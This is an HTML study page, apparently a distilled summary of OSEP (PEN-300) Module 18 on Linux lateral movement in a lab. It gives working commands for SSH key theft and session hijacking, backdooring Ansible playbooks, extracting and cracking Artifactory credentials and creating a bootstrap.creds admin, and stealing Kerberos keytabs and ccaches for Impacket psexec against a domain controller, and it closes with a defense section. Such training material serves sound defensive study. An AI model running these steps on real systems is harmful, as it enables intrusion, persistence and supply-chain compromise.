@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 18 — Linux Lateral Movement (SSH, DevOps: Ansible & Artifactory, Kerberos on Linux) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 18 — Linux Lateral Movement (SSH, DevOps: Ansible & Artifactory, Kerberos on Linux)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Pivot through Linux hosts after initial compromise. Linux runs much of an organization's web/database/infrastructure layer, so lateral movement must cover it just as thoroughly as Windows. The module walks three families of technique:</p>
+<ol>
+<li><strong>SSH</strong> — steal private keys (and crack their passphrases offline), hijack live sessions via ControlMaster and ssh-agent forwarding, plant persistence in <code>authorized_keys</code>.</li>
+<li><strong>DevOps</strong> — abuse large-scale automation tooling: Ansible (controller compromise, ad-hoc commands, playbook backdooring, Vault cracking, syslog credential leakage) and Artifactory (binary repository compromise → supply-chain pivot).</li>
+<li><strong>Kerberos on Linux</strong> — domain-joined Linux hosts as a bridge into Windows/AD: keytab theft, ccache theft, and Impacket attacks from Kali through a pivoted SOCKS proxy.</li>
+</ol>
+<p>Not every technique needs root, but — as with Windows lateral movement — most do.</p>
+<h2>Target surface</h2>
+<p>Kali <code>/etc/hosts</code> mappings used throughout the module (lab IPs verbatim):</p>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Host</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>controller</code></td>
+<td>192.168.120.40</td>
+</tr>
+<tr>
+<td><code>linuxvictim</code></td>
+<td>192.168.120.45</td>
+</tr>
+<tr>
+<td><code>dc01.corp1.com</code></td>
+<td>192.168.120.5</td>
+</tr>
+</tbody>
+</table></div>
+<p>Roles: <code>linuxvictim</code> is a node/domain-joined member of <code>corp1.com</code>; <code>controller</code> is the Ansible controller and the Artifactory server; <code>dc01</code> is the AD domain controller. All credential values encountered (SSH passphrases, Vault secrets, MySQL/Artifactory/AD passwords, bcrypt hashes) are redacted throughout this writeup.</p>
+<h2>Techniques</h2>
+<h3>1. Stealing SSH private keys</h3>
+<p>Private keys are prime targets: they grant access to <strong>every machine that accepts the key</strong>, not just the current host. Keys normally live in <code>~/.ssh/</code> and are chmod 600, but users copy them elsewhere or rename them.</p>
+<ul>
+<li>Even <strong>without root</strong>, check for weak-permission keys — <code>find /home/ -name "id_rsa"</code> (default name only; <code>Permission denied</code> per line means unreadable).</li>
+<li><strong>With root</strong>, browse other users' home dirs. Lab: <code>/home/linuxvictim/svuser.key</code> (<code>-rw-------</code>) sits in the home directory, not in <code>.ssh/</code>.</li>
+</ul>
+<p>Determine where a stolen key is accepted:</p>
+<ul>
+<li><code>svuser</code> doesn't exist in <code>/etc/passwd</code> on this host → the key is for another machine.</li>
+<li><code>~/.ssh/known_hosts</code> is often useless: <code>HashKnownHosts</code> in <code>/etc/ssh/ssh_config</code> hashes entries (<code>|1|mi1rx...|... ecdsa-sha2-nistp256 ...</code>).</li>
+<li><code>~/.bash_history</code> pays off — it shows <code>ssh -i ./svuser.key svuser@controller</code>. Resolve the host with <code>host controller</code> → 192.168.120.40.</li>
+</ul>
+<h3>2. Detecting and cracking key passphrases</h3>
+<p>Don't test the key against the SSH client — a failed attempt can trigger logs/alerts. Inspect the file instead:</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
+</code></pre>
+<p><code>Proc-Type: 4,ENCRYPTED</code> + a <code>DEK-Info</code> header = passphrase-protected. No headers = unencrypted, usable as-is.</p>
+<p>The passphrase check happens <strong>client-side</strong>, so cracking is fully offline. Convert with ssh2john, then JTR (Hashcat works too and can use the GPU):</p>
+<pre><code class="language-bash">python /usr/share/john/ssh2john.py svuser.key &gt; svuser.hash
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
+</code></pre>
+<p>Usage requires chmod 600 on the private key. Prefer connecting from the compromised host (linuxvictim) rather than Kali directly to avoid alerting: <code>ssh -i ./svuser.key svuser@controller</code> → shell as <code>svuser</code>.</p>
+<h3>3. SSH persistence via authorized_keys</h3>
+<p>Insert your public key into a target user's <code>~/.ssh/authorized_keys</code> for passwordless re-entry. With write access just append a line (normal path is <code>ssh-copy-id</code>, which requires authentication); <code>authorized_keys</code> must be 644, so usually only the owner or root can write it.</p>
+<pre><code class="language-bash"># on Kali
+ssh-keygen                                   # ~/.ssh/id_rsa + id_rsa.pub
+# on the victim, as the user or root
+echo &quot;ssh-rsa AAAA... kali@kali&quot; &gt;&gt; /home/linuxvictim/.ssh/authorized_keys
+# back on Kali
+ssh linuxvictim@linuxvictim                  # no password
+</code></pre>
+<h3>4. SSH hijacking with ControlMaster</h3>
+<p>Conceptually similar to taking over an existing RDP session on Windows: reuse an established SSH connection instead of authenticating. ControlMaster multiplexes sessions over one connection, configured per-user in <code>~/.ssh/config</code> (or system-wide in <code>/etc/ssh/ssh_config</code>):</p>
+<pre><code>Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p
+        ControlMaster auto
+        ControlPersist 10m
+</code></pre>
+<ul>
+<li><code>ControlPath</code> — socket location, named <code>&lt;user&gt;@&lt;host&gt;:&lt;port&gt;</code>; the directory must exist (<code>mkdir ~/.ssh/controlmaster</code>); <code>chmod 644 ~/.ssh/config</code>.</li>
+<li><code>ControlMaster auto</code> — reuse existing sockets, else open a new connection.</li>
+<li><code>ControlPersist</code> — <code>yes</code> keeps sockets open indefinitely; a duration (10m here) keeps them accept-bound after the last session closes. <code>MaxSessions</code> (default 10) caps concurrent multiplexed sessions.</li>
+</ul>
+<p><strong>Scenario A — same unprivileged user.</strong> We control <code>offsec</code> on the controller. A legitimate <code>offsec</code> session to linuxvictim creates the socket <code>srw------- offsec@linuxvictim:22</code>. We simply run <code>ssh offsec@linuxvictim</code> — piggybacked, no password.</p>
+<p><strong>Scenario B — root.</strong> Root can point the SSH client at <em>another user's</em> socket with <code>-S</code>:</p>
+<pre><code class="language-bash">ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
+</code></pre>
+<p>Both scenarios require an <strong>open victim connection</strong> to exist.</p>
+<h3>5. SSH hijacking with agent forwarding</h3>
+<p>ssh-agent keeps decrypted private keys in memory so passphrases aren't retyped. Agent forwarding lets key challenges from a remote destination be passed back through an intermediate host to the origin client's agent — the private key never lands on the intermediate and the passphrase is typed once. Legit setup: keypair with passphrase on the origin, <code>ssh-copy-id</code> the pubkey to both intermediate and destination, <code>ForwardAgent yes</code> in the client's <code>~/.ssh/config</code>, <code>AllowAgentForwarding yes</code> in the intermediate's <code>/etc/ssh/sshd_config</code>.</p>
+<p><strong>Unprivileged attacker:</strong> log in as the compromised user on the intermediate server and run <code>ssh offsec@linuxvictim</code> — the forwarded agent answers the challenge. Unlike ControlMaster, this works against <strong>any</strong> host the victim's key can reach, not just ones with existing downstream connections. Still requires the victim to have an active session.</p>
+<p><strong>Root attacker — avoid logging in as the victim (fewer log artifacts).</strong> The agent exposes a UNIX socket; read it out of the victim's live shell process environment:</p>
+<pre><code class="language-bash">ps aux | grep ssh            # find &quot;sshd: offsec@pts/N&quot;
+pstree -p offsec | grep ssh  # sshd(16380)---bash(16381)
+cat /proc/16381/environ      # ... SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
+</code></pre>
+<p>Then reuse the socket directly:</p>
+<pre><code class="language-bash">SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l     # confirm the key
+SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
+</code></pre>
+<h3>6. Ansible — enumeration and ad-hoc commands</h3>
+<p>Ansible is a push-model configuration manager: a controller connects to inventory nodes, ships Python modules to them, executes them, deletes the artifacts, and collects results. The controller account typically has root/sudo on every node — compromising the controller (or its SSH key) compromises the whole inventory at once.</p>
+<ul>
+<li>Inventory: <code>/etc/ansible/hosts</code> (lab: group <code>[victims]</code> → <code>linuxvictim</code>).</li>
+<li><strong>Enumerate</strong>: is <code>ansible</code> installed (run it bare for usage output), <code>/etc/ansible/</code> exists, "ansible"-named users in <code>/etc/passwd</code>, ansible home folders, ansible messages in syslog.</li>
+<li><strong>Ad-hoc commands</strong> across the whole group: <code>ansible victims -a "whoami"</code>; add <code>--become</code> to run as root (default) or another user on the nodes.</li>
+</ul>
+<h3>7. Ansible playbooks, credential theft, and Vault cracking</h3>
+<p>Playbooks are YAML: <code>name</code>, <code>hosts</code>, <code>gather_facts</code> (facts fill <code>{{ ansible_hostname }}</code>-style variables), and <code>tasks</code> invoking modules; <code>become: yes</code> elevates.</p>
+<p>Credential-hunting ladder:</p>
+<ul>
+<li><strong>Root / ansible-admin on the controller</strong> → run arbitrary playbooks on all nodes (elevated), or steal the controller's SSH private key — often passphrase-less, since automation can't type passphrases.</li>
+<li><strong>Read access to playbooks</strong> → admins sometimes hardcode node credentials, e.g. <code>vars:</code> with <code>ansible_become_pass: &lt;redacted&gt;</code>. Playbooks aren't always restricted to admin+root.</li>
+<li><strong>Ansible Vault</strong> encrypts secrets inline:</li>
+</ul>
+<p><code>yaml
+  ansible_become_pass: !vault |
+      $ANSIBLE_VAULT;1.1;AES256
+      ...</code></p>
+<p>Crack it offline: copy the <code>$ANSIBLE_VAULT...</code> block (no leading whitespace) into a file, then</p>
+<p><code>bash
+  python3 /usr/share/john/ansible2john.py test.yml      # → $ansible$0*0*... hash
+  hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
+  cat pw.txt | ansible-vault decrypt                    # recover the original secret</code></p>
+<h3>8. Backdooring writable playbooks</h3>
+<p>A playbook writable by us (directly, or via group membership — lab: <code>getinfowritable.yaml</code> is writable by group <code>ansible</code>, and our <code>bystander</code> foothold is in that group) executes with whatever privileges the playbook has, on every host it targets. Inject tasks that preserve the original functionality and add ours with <code>become: yes</code>:</p>
+<pre><code class="language-yaml">- name: ensure /root/.ssh exists
+  file: path=/root/.ssh state=directory mode=0700
+- name: ensure authorized_keys exists
+  file: path=/root/.ssh/authorized_keys state=touch mode=0600
+- name: add our key
+  lineinfile: dest=/root/.ssh/authorized_keys line=&quot;ssh-rsa AAAA... kali@kali&quot;
+</code></pre>
+<p>Next time the admin runs the playbook, our key lands in root's <code>authorized_keys</code> on every managed host → passwordless <code>ssh root@linuxvictim</code>.</p>
+<p>For arbitrary command execution, remember Ansible tasks are <strong>idempotent modules</strong> — to run shell commands, insert a <code>shell:</code> task, made fire-and-forget with <code>async: 10</code> + <code>poll: 0</code> so the playbook completes without waiting on our payload:</p>
+<pre><code class="language-yaml">- name: demo
+  shell: touch /tmp/mycreatedfile.txt
+  async: 10
+  poll: 0
+</code></pre>
+<p>Re-run → root-owned artifact on linuxvictim. Alternatives: SSH in with our own root key, or make the injected task return a reverse shell.</p>
+<h3>9. Ansible leaking credentials to syslog</h3>
+<p>Some modules (notably <code>shell</code>) log their full module parameters to <code>/var/log/syslog</code> on the managed node when parameters aren't fixed — unless the task sets <code>no_log: true</code>. The classic bad pattern: an admin embeds plaintext DB credentials in a frequently-run backup playbook because <em>the playbook itself</em> is admin/root-only readable:</p>
+<pre><code>mysql --user=root --password=&lt;REDACTED&gt; --host=databaseserver --databases tpsreports
+</code></pre>
+<p>Attack: read <code>/var/log/syslog</code> on the managed node — the <code>Invoked with ... _raw_params=mysql --user=root --password=... --host=...</code> line leaks username, password, and DB host → pivot to the database server. Recon tip: <code>grep password /var/log/syslog</code>.</p>
+<h3>10. Artifactory — the supply-chain target</h3>
+<p>Artifactory (JFrog) is a binary repository manager — "single source of truth" for packages/binaries that producers upload and consumers/automation pull. Compromise one server or one write-access account and every downstream user becomes a victim via a trusted source. Alternatives with the same attack surface: Apache Archiva, Sonatype Nexus, CloudRepo, Cloudsmith.</p>
+<ul>
+<li>Enumerate on-host: <code>ps aux | grep artifactory</code>; externally: web UI, default external port <strong>8081</strong> (lab runs it at <code>http://controller:8082/</code>), installed under <code>/opt/jfrog/artifactory</code>, started with <code>sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start</code>.</li>
+<li>Repos are typed (Gradle/Ivy/Maven/SBT/Generic in open source); the lab has <code>generic-local</code>. "Set Me Up" reveals the curl upload/download usage per artifact; artifact metadata shows download path, deployer, timestamps, and download count.</li>
+<li>Simply replacing binaries on disk <strong>doesn't work</strong>: the filestore (<code>/opt/jfrog/artifactory/var/data/artifactory/filestore/&lt;2-char&gt;/&lt;hash&gt;</code>) stores content by SHA hash with integrity checks. Attack the credentials or the database instead.</li>
+</ul>
+<h3>11. Cracking Artifactory users from backups and the DB</h3>
+<p>Users/passwords live in a database — commercial editions use Postgres; the open-source default is the bundled <strong>Apache Derby</strong>.</p>
+<p><strong>Via backups (root, no app credentials needed).</strong> Open-source Artifactory writes DB backups as JSON under <code>&lt;ARTIFACTORY_FOLDER&gt;/var/backup/access/</code> (<code>access.backup.&lt;timestamp&gt;.json</code>) containing full user records: <code>password: bcrypt$$2a$...</code> hashes, <code>allowedIps</code>, <code>status</code>. Note <code>admin</code> was restricted to <code>ALLOWED_IPS 127.0.0.1</code> while <code>developer</code> was unrestricted. Copy hashes to Kali and crack offline:</p>
+<pre><code class="language-bash">sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Directly from the DB (no usable backups).</strong> Derby locks the database while running — removing locks in place risks corruption, so copy it elsewhere first:</p>
+<pre><code class="language-bash">mkdir /tmp/hackeddb
+sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb/
+sudo chmod 755 /tmp/hackeddb -R
+sudo rm /tmp/hackeddb/derby/*.lck          # remove lock files on the copy
+</code></pre>
+<p>Query the copy with Derby's <code>ij</code> tool, driven by Artifactory's bundled Java (the default Derby DB has no username/password — it's protected by file permissions alone, so root suffices):</p>
+<pre><code>sudo /opt/jfrog/artifactory/app/third-party/java/bin/java \
+    -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
+ij&gt; connect 'jdbc:derby:/tmp/hackeddb/derby';
+ij&gt; select * from access_users;
+</code></pre>
+<p>Rows expose username, bcrypt hash, allowed IPs, status → crack offline (Hashcat/John). With a working login, modify hosted binaries: when a user updates their software, Artifactory serves our backdoored artifact — one compromise, many victims. (Third-party DBs like Postgres may not lock files, in which case direct user-record injection into a live DB is also possible.)</p>
+<h3>12. Artifactory admin backdoor via bootstrap.creds</h3>
+<p>Artifactory ships a built-in recovery mechanism: a bootstrap credentials file processed at startup. Requirements: write access to <code>/opt/jfrog/artifactory/var/etc/access</code> + ability to chmod (root/sudo) + an Artifactory restart (downtime/data-corruption risk — weigh against the engagement).</p>
+<pre><code class="language-bash">echo 'haxmin@*=&lt;REDACTED&gt;' | sudo tee /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+# file format: &lt;newuser&gt;@*=&lt;password&gt;   (&quot;*&quot; = allow connections from any IP)
+sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
+</code></pre>
+<p>Verify in <code>/opt/jfrog/artifactory/var/log/console.log</code> — expect <code>[ACCESS BOOTSTRAP] Create admin user 'haxmin'</code>. Log in as the new admin → same binary-tampering pivot as above.</p>
+<h3>13. Kerberos on Linux — how domain-joined hosts use it</h3>
+<p>Linux can use a Linux KDC or AD directly. In the lab, <code>linuxvictim</code> is joined to <code>corp1.com</code>; AD users log in with domain credentials (e.g. <code>ssh administrator@corp1.com@linuxvictim</code>). Client-side tooling:</p>
+<ul>
+<li>Credential cache (ccache) location in <code>KRB5CCNAME</code> (<code>env | grep KRB5CCNAME</code>), typically <code>FILE:/tmp/krb5cc_&lt;uid&gt;_&lt;rand&gt;</code>.</li>
+<li><code>kinit</code> (enter the AD password) → TGT; <code>klist</code> → list cached tickets; <code>kdestroy</code> → drop them.</li>
+<li>Enumerate SPNs over LDAP, letting the password prompt fall through to Kerberos:</li>
+</ul>
+<p><code>bash
+  ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com \
+      -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*"</code></p>
+<p>Yields TERMSRV/ldap/DNS service tickets and <code>MSSQLSvc/DC01.corp1.com:1433</code>, <code>appsrv01</code>, etc.
+- Request a service ticket and check it landed: <code>kvno MSSQLSvc/DC01.corp1.com:1433</code> → ticket in ccache → MSSQL access as that user.</p>
+<h3>14. Stealing keytab files</h3>
+<p>A <strong>keytab</strong> holds a Kerberos principal's keys so scripts (commonly in cron) authenticate passwordlessly. Recon: read <code>/etc/crontab</code>, follow the referenced scripts to find keytab paths and their associated users. Creation (for the lab, as the domain admin) via <code>ktutil</code>: <code>addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac</code>, <code>wkt /tmp/administrator.keytab</code>.</p>
+<p>Attack: with root (or any read access — weak permissions are sometimes set for sharing):</p>
+<pre><code class="language-bash">kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab   # TGT → our ccache
+kinit -R                                                        # renew a renewable expired TGT, no password
+smbclient -k -U &quot;CORP1.COM\administrator&quot; //DC01.CORP1.COM/C$   # domain-admin action: C$ listed
+</code></pre>
+<h3>15. Stealing ccache files</h3>
+<p>Two scenarios: (1) compromise an active user's session and use their current tickets directly; (2) steal the ccache file itself. Ccaches live at <code>/tmp/krb5cc_&lt;uid&gt;_&lt;rand&gt;</code> mode 600 — usually need root/privileged read. Identify the victim's by owner (<code>ls -al /tmp/krb5cc_*</code> shows e.g. <code>administrator@corp1.com domain users@corp1.com</code>).</p>
+<pre><code class="language-bash">sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+sudo chown offsec:offsec /tmp/krb5cc_minenow
+kdestroy
+export KRB5CCNAME=/tmp/krb5cc_minenow
+klist                                  # Administrator@CORP1.COM TGT + ldap + MSSQL tickets
+kvno MSSQLSvc/DC01.corp1.com:1433      # request new service tickets as the domain admin
+</code></pre>
+<h3>16. Impacket from Kali through a Kerberized pivot</h3>
+<p>Kerberos validates the <strong>source IP</strong>, so tickets stolen on the domain-joined linuxvictim must be used from linuxvictim — pivot with an SSH SOCKS proxy and proxychains (comment out <code>proxy_dns</code> in <code>/etc/proxychains.conf</code> to avoid DNS conflicts):</p>
+<pre><code class="language-bash">scp stolen-ccache kali:                # move the ccache to Kali
+ssh offsec@linuxvictim -D 9050         # SOCKS proxy through the domain-joined host
+export KRB5CCNAME=/path/to/ccache
+sudo apt install krb5-user             # realm corp1.com
+</code></pre>
+<p>Name resolution matters — <code>/etc/hosts</code>: <code>192.168.120.5 CORP1.COM DC01.CORP1.COM</code> (DC; get its IP with <code>host corp1.com</code> from linuxvictim), plus <code>192.168.120.40 controller</code> and <code>192.168.120.45 linuxvictim</code>. Then, all through <code>proxychains</code> with Impacket (<code>/usr/share/doc/python3-impacket/</code>):</p>
+<pre><code class="language-bash">proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains python3 GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains python3 psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+</code></pre>
+<p>GetADUsers dumps the domain user list; GetUserSPNs reveals service accounts (lab: <code>sqlsvc</code> with MSSQL SPNs on appsrv01/dc01 — and <code>sqlsvc</code> was in the local Administrators group); <code>psexec.py</code> with <code>-k -no-pass</code> Kerberizes, uploads a service binary, creates and starts the service → <strong>SYSTEM shell on the domain controller</strong>.</p>
+<p><strong>Extra mile (cross-platform pass-the-ticket):</strong> a Windows 10 client logged in as domain admin holds the TGT in memory → reverse shell → export the ticket (kirbi) to Kali → convert kirbi→ccache → with the network firewalled to simulate segmentation, pass the ticket to the DC and pivot through the Windows client.</p>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>SSH key hygiene</strong>: hunt for stray keys (<code>find / -name "id_rsa"</code>, home-directory copies like <code>svuser.key</code>) in your own estate; enforce passphrases <em>and</em> assume they'll be cracked — passphrase strength is the only barrier once a key is stolen (<code>ssh2john</code>/JTR). <code>HashKnownHosts</code> blunts known_hosts recon; <code>.bash_history</code> will still betray connection targets.</li>
+<li><strong>ControlMaster/agent forwarding</strong>: both hijacks require an existing victim session. Restrict <code>AllowAgentForwarding</code> (and disable it by default in <code>sshd_config</code>); avoid <code>ControlPersist yes</code>; monitor for <code>~/.ssh/controlmaster</code> socket directories appearing for users who never configured them — the course's attack starts by <em>writing</em> that config into a victim's home. Root's <code>/proc/&lt;pid&gt;/environ</code> socket reuse leaves no SSH login as the victim — watch for root sessions reading other users' process environments.</li>
+<li><strong>authorized_keys backdoors</strong>: file must stay 644 and owned correctly; audit <code>authorized_keys</code> changes (new keys appended are the classic persistence), consider AIDE/tripwire-style monitoring of <code>~/.ssh</code>.</li>
+<li><strong>Ansible</strong>: lock down the controller host and its key (it is root-on-every-node by design); restrict playbook read access — hardcoded <code>vars</code> credentials and Vault-protected secrets both fall to offline cracking (<code>ansible2john</code> → hashcat mode 16900); playbook <em>write</em> access on any group-writable file is code execution as root on all inventory hosts; set <code>no_log: true</code> on tasks handling secrets, and treat <code>/var/log/syslog</code> as credential-bearing (the module's grep-password recon works on any unhardened node).</li>
+<li><strong>Artifactory</strong>: restrict read access to <code>/var/backup/access</code> (JSON backups leak bcrypt hashes for offline cracking) and <code>/var/data/access/derby</code>; file permissions are the <em>only</em> protection on the embedded Derby DB; disable or tightly control the <code>bootstrap.creds</code> recovery path (root + restart required, but it silently creates an any-IP admin); above all — repository managers are trusted distribution points, so compromise there propagates to every consumer. Monitor artifact deploy/replace events.</li>
+<li><strong>Kerberos on Linux</strong>: inventory cron jobs and scripts for keytab files and lock their permissions (600, owner-only — the attack needed only <em>read</em> access); ccaches in <code>/tmp</code> are mode-600 but root-readable, and any foothold with sudo can copy, chown, and export one; remember tickets are source-IP-bound, so SSH SOCKS pivots are the attacker's workaround — egress filtering and monitoring proxychains-style traffic from Linux hosts toward the DC (GetADUsers/GetUserSPNs/psexec all arrived over one SOCKS channel) is the detection lever.</li>
+</ul>
+<h2>Exercises (from the module)</h2>
+<ul>
+<li>Generate a passphrase-protected keypair and crack it with JTR; plant your public key in <code>authorized_keys</code> on linuxvictim.</li>
+<li>Ad-hoc Ansible command; reverse-shell playbook; inject a <code>shell:</code> task into <code>getinfowritable.yaml</code> for a Meterpreter shell.</li>
+<li>Copy the Artifactory DB, extract and crack hashes; deploy a backdoored binary and trigger a user download; add a <code>bootstrap.creds</code> admin.</li>
+<li>Create a keytab as domain admin and steal it as root; steal the admin ccache and use it; enumerate SPNs with Impacket and get a DC shell.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
